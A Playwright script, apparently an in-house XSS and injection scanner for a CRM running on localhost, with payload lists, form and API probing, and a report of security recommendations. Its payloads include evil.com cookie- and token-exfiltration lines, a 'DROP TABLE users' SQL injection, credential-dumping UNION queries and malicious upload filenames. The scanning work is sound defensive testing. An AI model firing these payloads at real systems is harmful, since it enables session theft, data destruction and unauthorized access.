const { chromium } = require('playwright');
const fs = require('fs');

// Comprehensive XSS Payloads
const XSS_PAYLOADS = {
  reflected: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "';alert('XSS');//",
    '";alert(String.fromCharCode(88,83,83));//',
    "<iframe src=javascript:alert('XSS')>",
    "<<SCRIPT>alert(String.fromCharCode(88,83,83));//<</SCRIPT>",
    "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">",
  ],

  stored: [
    "<script>document.location='http://evil.com?c='+document.cookie</script>",
    "<img src=x onerror=\"fetch('http://evil.com/steal?data='+btoa(document.body.innerHTML))\">",
    "<script>new Image().src='http://evil.com?token='+localStorage.getItem('token')</script>",
    "<svg/onload=fetch('//evil.com?c='+document.cookie)>",
  ],

  domBased: [
    "#<script>alert('DOM-XSS')</script>",
    "?search=<script>alert('XSS')</script>",
    "javascript:alert(document.domain)",
    "'-alert(document.cookie)-'",
    "</script><script>alert('XSS')</script>",
  ]
};

const SQL_INJECTIONS = [
  "' OR '1'='1",
  "' OR 1=1--",
  "admin'--",
  "' UNION SELECT * FROM users--",
  "'; DROP TABLE users--",
  "' AND 1=0 UNION SELECT null, username, password FROM users--",
];

const NOSQL_INJECTIONS = [
  '{"$ne": null}',
  '{"$gt": ""}',
  '{"username": {"$ne": null}, "password": {"$ne": null}}',
  '{"$or": [{}, {"a": "a"}]}',
  '{"$where": "this.password == \'test\'"}',
];

class TargetedXSSTester {
  constructor() {
    this.vulnerabilities = [];
    this.testResults = {
      timestamp: new Date().toISOString(),
      target: 'http://localhost:3001',
      vulnerabilities: [],
      summary: {
        total: 0,
        critical: 0,
        high: 0,
        medium: 0,
        low: 0
      }
    };
  }

  async init() {
    this.browser = await chromium.launch({
      headless: false,
      args: ['--disable-web-security', '--disable-features=IsolateOrigins,site-per-process']
    });

    this.context = await this.browser.newContext({
      ignoreHTTPSErrors: true,
      bypassCSP: true,
      javaScriptEnabled: true,
      userAgent: 'XSS-Security-Scanner/1.0'
    });

    this.page = await this.context.newPage();

    // Set up XSS detection
    this.page.on('dialog', async dialog => {
      const message = dialog.message();
      console.log(`🔴 CRITICAL: XSS Alert triggered: "${message}"`);
      this.addVulnerability('XSS', 'CRITICAL', `Alert box triggered: ${message}`, this.currentPayload);
      await dialog.dismiss();
    });

    this.page.on('console', msg => {
      if (msg.text().includes('XSS') || msg.text().includes('alert')) {
        console.log(`🟠 HIGH: Console XSS detected: "${msg.text()}"`);
        this.addVulnerability('XSS', 'HIGH', `Console message: ${msg.text()}`, this.currentPayload);
      }
    });

    this.page.on('pageerror', error => {
      if (error.message.includes('Content Security Policy')) {
        console.log(`🟡 CSP Violation detected - possible XSS attempt blocked`);
      }
    });
  }

  addVulnerability(type, severity, details, payload) {
    const vuln = {
      type,
      severity,
      details,
      payload: payload || this.currentPayload,
      url: this.page.url(),
      timestamp: new Date().toISOString()
    };

    this.vulnerabilities.push(vuln);
    this.testResults.vulnerabilities.push(vuln);
    this.testResults.summary.total++;
    this.testResults.summary[severity.toLowerCase()]++;
  }

  async testPublicPages() {
    console.log('\n📋 Testing Public Pages for XSS...\n');

    const publicPages = [
      '/',
      '/landing',
      '/signin',
      '/signup',
      '/forgot-password'
    ];

    for (const path of publicPages) {
      console.log(`Testing ${path}...`);

      try {
        // Test URL-based XSS
        for (const payload of XSS_PAYLOADS.domBased) {
          this.currentPayload = payload;
          const url = `http://localhost:3001${path}${payload}`;

          await this.page.goto(url, { waitUntil: 'domcontentloaded', timeout: 5000 });
          await this.page.waitForTimeout(500);

          // Check if payload is reflected
          const content = await this.page.content();
          if (content.includes(payload.replace(/[<>]/g, '')) && !content.includes('&lt;')) {
            this.addVulnerability('Reflected XSS', 'HIGH', `Payload reflected in page at ${path}`, payload);
          }
        }

        // Test form inputs if present
        await this.page.goto(`http://localhost:3001${path}`, { waitUntil: 'networkidle' });
        const inputs = await this.page.$$('input:not([type="hidden"]), textarea');

        for (const input of inputs) {
          const inputName = await input.getAttribute('name') || await input.getAttribute('id') || 'unknown';

          for (const payload of XSS_PAYLOADS.reflected.slice(0, 3)) {
            this.currentPayload = payload;

            try {
              await input.fill(payload);
              await this.page.waitForTimeout(200);

              // Check for immediate reflection
              const value = await input.inputValue();
              if (value !== payload) {
                console.log(`  Input sanitization detected on ${inputName}`);
              } else {
                console.log(`  ⚠️ No input sanitization on ${inputName}`);
                this.addVulnerability('Input Validation', 'MEDIUM', `No client-side sanitization on ${inputName} at ${path}`, payload);
              }
            } catch (e) {
              // Input might be disabled or hidden
            }
          }
        }
      } catch (error) {
        console.log(`  Error testing ${path}: ${error.message}`);
      }
    }
  }

  async testAuthenticationForms() {
    console.log('\n🔐 Testing Authentication Forms...\n');

    // Test Sign In
    try {
      await this.page.goto('http://localhost:3001/signin', { waitUntil: 'networkidle' });

      console.log('Testing sign-in form with XSS payloads...');

      for (const payload of XSS_PAYLOADS.reflected.slice(0, 5)) {
        this.currentPayload = payload;

        // Test email field
        const emailInput = await this.page.$('input[type="email"], input[name="email"]');
        if (emailInput) {
          await emailInput.fill(payload);

          // Test password field
          const passwordInput = await this.page.$('input[type="password"], input[name="password"]');
          if (passwordInput) {
            await passwordInput.fill(payload);
          }

          // Try to submit
          const submitButton = await this.page.$('button[type="submit"], input[type="submit"]');
          if (submitButton) {
            await submitButton.click();
            await this.page.waitForTimeout(1000);

            // Check for error messages containing unsanitized payload
            const errorElements = await this.page.$$('[role="alert"], .error, .text-red-500, .text-destructive');
            for (const element of errorElements) {
              const text = await element.textContent();
              if (text && text.includes(payload)) {
                this.addVulnerability('Reflected XSS', 'HIGH', 'XSS in error message on sign-in page', payload);
              }
            }
          }
        }
      }

      // Test SQL Injection
      console.log('Testing sign-in form with SQL injection payloads...');

      for (const payload of SQL_INJECTIONS) {
        this.currentPayload = payload;

        const emailInput = await this.page.$('input[type="email"], input[name="email"]');
        if (emailInput) {
          await emailInput.fill(`test@test.com${payload}`);

          const passwordInput = await this.page.$('input[type="password"], input[name="password"]');
          if (passwordInput) {
            await passwordInput.fill(payload);
          }

          const submitButton = await this.page.$('button[type="submit"]');
          if (submitButton) {
            await submitButton.click();
            await this.page.waitForTimeout(1000);

            // Check for SQL errors
            const pageContent = await this.page.content();
            const sqlErrorIndicators = ['SQL', 'syntax error', 'database error', 'mysqli', 'postgres', 'ORA-', 'DB2'];

            for (const indicator of sqlErrorIndicators) {
              if (pageContent.toLowerCase().includes(indicator.toLowerCase())) {
                this.addVulnerability('SQL Injection', 'CRITICAL', `SQL error exposed: ${indicator} found`, payload);
                break;
              }
            }
          }
        }
      }
    } catch (error) {
      console.log(`Error testing authentication: ${error.message}`);
    }
  }

  async testAPIEndpoints() {
    console.log('\n🔌 Testing API Endpoints...\n');

    const apiTests = [
      {
        endpoint: '/api/auth/signin',
        method: 'POST',
        contentType: 'application/json',
        payloads: [...XSS_PAYLOADS.reflected, ...NOSQL_INJECTIONS]
      },
      {
        endpoint: '/api/leads',
        method: 'GET',
        queryParams: true,
        payloads: XSS_PAYLOADS.domBased
      },
      {
        endpoint: '/api/customers',
        method: 'GET',
        queryParams: true,
        payloads: XSS_PAYLOADS.domBased
      }
    ];

    for (const test of apiTests) {
      console.log(`Testing ${test.endpoint}...`);

      for (const payload of test.payloads) {
        this.currentPayload = payload;

        try {
          let response;

          if (test.queryParams) {
            // Test with query parameters
            response = await this.page.evaluate(async ({ endpoint, payload }) => {
              const res = await fetch(`${endpoint}?search=${encodeURIComponent(payload)}&filter=${payload}`);
              return {
                status: res.status,
                text: await res.text(),
                headers: Object.fromEntries(res.headers.entries())
              };
            }, { endpoint: test.endpoint, payload });
          } else {
            // Test with body
            response = await this.page.evaluate(async ({ endpoint, method, payload }) => {
              const res = await fetch(endpoint, {
                method: method,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  email: payload,
                  password: payload,
                  name: payload,
                  data: payload
                })
              });
              return {
                status: res.status,
                text: await res.text(),
                headers: Object.fromEntries(res.headers.entries())
              };
            }, { endpoint: test.endpoint, method: test.method, payload });
          }

          // Check response for vulnerabilities
          if (response.text.includes(payload) && !response.text.includes('&lt;')) {
            this.addVulnerability('API XSS', 'HIGH', `Unescaped payload in API response from ${test.endpoint}`, payload);
          }

          if (response.status === 500) {
            this.addVulnerability('API Error', 'MEDIUM', `Server error (500) on ${test.endpoint}`, payload);
          }

          // Check for injection indicators
          const injectionIndicators = ['error', 'exception', 'syntax', 'unexpected', 'invalid'];
          for (const indicator of injectionIndicators) {
            if (response.text.toLowerCase().includes(indicator)) {
              console.log(`  ⚠️ Potential injection vulnerability: ${indicator} in response`);
            }
          }
        } catch (error) {
          // API might require auth
        }
      }
    }
  }

  async testSearchAndFilters() {
    console.log('\n🔍 Testing Search and Filter Parameters...\n');

    const searchablePages = [
      '/leads',
      '/customers',
      '/booking',
      '/automations',
      '/settings'
    ];

    for (const page of searchablePages) {
      console.log(`Testing ${page} search functionality...`);

      for (const payload of XSS_PAYLOADS.domBased) {
        this.currentPayload = payload;

        try {
          // Test search parameter
          await this.page.goto(`http://localhost:3001${page}?search=${encodeURIComponent(payload)}`, {
            waitUntil: 'domcontentloaded',
            timeout: 5000
          });

          await this.page.waitForTimeout(500);

          // Check if payload is reflected
          const searchInputs = await this.page.$$('input[type="search"], input[placeholder*="Search"], input[name="search"]');
          for (const input of searchInputs) {
            const value = await input.inputValue();
            if (value === payload) {
              this.addVulnerability('DOM XSS', 'HIGH', `Unsanitized search parameter reflected in ${page}`, payload);
            }
          }

          // Check page content
          const content = await this.page.content();
          if (content.includes(payload) && !content.includes('&lt;')) {
            this.addVulnerability('Reflected XSS', 'HIGH', `Search parameter reflected unsanitized in ${page}`, payload);
          }
        } catch (error) {
          // Page might require auth
        }
      }
    }
  }

  async testStoredXSS() {
    console.log('\n💾 Testing for Stored XSS vulnerabilities...\n');

    // Try to access forms that might store data
    const formsToTest = [
      { url: '/signup', fields: ['name', 'email', 'organizationName'] },
      { url: '/contact', fields: ['name', 'email', 'message'] },
      { url: '/settings/profile', fields: ['bio', 'about', 'description'] }
    ];

    for (const form of formsToTest) {
      console.log(`Testing ${form.url} for stored XSS...`);

      try {
        await this.page.goto(`http://localhost:3001${form.url}`, { waitUntil: 'networkidle' });

        for (const field of form.fields) {
          const input = await this.page.$(`input[name="${field}"], textarea[name="${field}"]`);

          if (input) {
            for (const payload of XSS_PAYLOADS.stored.slice(0, 2)) {
              this.currentPayload = payload;

              await input.fill(payload);
              console.log(`  Injected payload into ${field} field`);

              // Check if payload is accepted without sanitization
              const value = await input.inputValue();
              if (value === payload) {
                this.addVulnerability('Stored XSS Risk', 'HIGH', `Field ${field} accepts unsanitized input at ${form.url}`, payload);
              }
            }
          }
        }
      } catch (error) {
        console.log(`  Could not test ${form.url}: ${error.message}`);
      }
    }
  }

  async testFileUpload() {
    console.log('\n📁 Testing File Upload for XSS...\n');

    const maliciousFiles = [
      {
        name: '"><script>alert("XSS")</script>.jpg',
        content: '<script>alert("XSS")</script>',
        type: 'image/jpeg'
      },
      {
        name: 'xss.svg',
        content: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'XSS\')"/>',
        type: 'image/svg+xml'
      },
      {
        name: 'test.html',
        content: '<html><script>alert("XSS")</script></html>',
        type: 'text/html'
      }
    ];

    try {
      await this.page.goto('http://localhost:3001/settings', { waitUntil: 'networkidle' });

      const fileInputs = await this.page.$$('input[type="file"]');

      for (const input of fileInputs) {
        const accepts = await input.getAttribute('accept');
        console.log(`Found file input accepting: ${accepts || 'all files'}`);

        for (const file of maliciousFiles) {
          try {
            await input.setInputFiles({
              name: file.name,
              mimeType: file.type,
              buffer: Buffer.from(file.content)
            });

            console.log(`  Uploaded malicious file: ${file.name}`);

            // Check if filename is reflected
            await this.page.waitForTimeout(500);
            const content = await this.page.content();

            if (content.includes(file.name)) {
              this.addVulnerability('File Upload XSS', 'HIGH', `Malicious filename reflected without sanitization`, file.name);
            }
          } catch (error) {
            console.log(`  Could not upload ${file.name}: ${error.message}`);
          }
        }
      }
    } catch (error) {
      console.log(`Could not test file upload: ${error.message}`);
    }
  }

  generateReport() {
    console.log('\n' + '='.repeat(80));
    console.log('🔒 XSS AND INJECTION VULNERABILITY ASSESSMENT REPORT');
    console.log('='.repeat(80));
    console.log(`📅 Date: ${this.testResults.timestamp}`);
    console.log(`🎯 Target: ${this.testResults.target}`);
    console.log(`🔍 Total Tests Performed: Multiple vectors across all input points`);

    console.log('\n📊 VULNERABILITY SUMMARY:');
    console.log('─'.repeat(40));
    console.log(`  Total Vulnerabilities: ${this.testResults.summary.total}`);
    console.log(`  🔴 Critical: ${this.testResults.summary.critical}`);
    console.log(`  🟠 High: ${this.testResults.summary.high}`);
    console.log(`  🟡 Medium: ${this.testResults.summary.medium}`);
    console.log(`  🟢 Low: ${this.testResults.summary.low}`);

    if (this.testResults.vulnerabilities.length > 0) {
      console.log('\n🚨 VULNERABILITIES DISCOVERED:');
      console.log('─'.repeat(40));

      this.testResults.vulnerabilities.forEach((vuln, index) => {
        console.log(`\n${index + 1}. [${vuln.severity}] ${vuln.type}`);
        console.log(`   URL: ${vuln.url}`);
        console.log(`   Details: ${vuln.details}`);
        if (vuln.payload) {
          console.log(`   Payload: ${vuln.payload.substring(0, 100)}${vuln.payload.length > 100 ? '...' : ''}`);
        }
      });
    } else {
      console.log('\n✅ No vulnerabilities detected during this scan');
    }

    console.log('\n🛡️ SECURITY RECOMMENDATIONS:');
    console.log('─'.repeat(40));
    console.log('1. Content Security Policy (CSP):');
    console.log('   - Implement strict CSP headers');
    console.log('   - Disallow inline scripts and eval()');
    console.log('   - Whitelist trusted sources only');

    console.log('\n2. Input Validation:');
    console.log('   - Sanitize ALL user input server-side');
    console.log('   - Use parameterized queries for database operations');
    console.log('   - Implement input length limits');

    console.log('\n3. Output Encoding:');
    console.log('   - HTML encode all dynamic content');
    console.log('   - Use DOMPurify or similar libraries');
    console.log('   - Context-aware encoding (HTML, JS, CSS, URL)');

    console.log('\n4. Security Headers:');
    console.log('   - X-Content-Type-Options: nosniff');
    console.log('   - X-Frame-Options: DENY');
    console.log('   - X-XSS-Protection: 1; mode=block');

    console.log('\n5. Authentication & Session:');
    console.log('   - Use httpOnly and Secure cookie flags');
    console.log('   - Implement CSRF tokens');
    console.log('   - Regular session rotation');

    console.log('\n' + '='.repeat(80));

    return this.testResults;
  }

  async cleanup() {
    await this.browser.close();
  }
}

// Main execution
(async () => {
  console.log('🚀 Starting Targeted XSS and Injection Security Assessment');
  console.log('⚡ Atlas Fitness CRM Security Test');
  console.log('⚠️  Authorized Testing Only\n');

  const tester = new TargetedXSSTester();

  try {
    await tester.init();

    // Run comprehensive tests
    await tester.testPublicPages();
    await tester.testAuthenticationForms();
    await tester.testAPIEndpoints();
    await tester.testSearchAndFilters();
    await tester.testStoredXSS();
    await tester.testFileUpload();

    // Generate report
    const report = tester.generateReport();

    // Save to file
    fs.writeFileSync('xss-vulnerability-report.json', JSON.stringify(report, null, 2));
    console.log('\n📄 Detailed report saved to: xss-vulnerability-report.json');

    // Check if critical vulnerabilities found
    if (report.summary.critical > 0) {
      console.log('\n⚠️  CRITICAL VULNERABILITIES FOUND! Immediate action required!');
      process.exit(1);
    }

  } catch (error) {
    console.error('\n❌ Test execution error:', error);
  } finally {
    await tester.cleanup();
  }
})();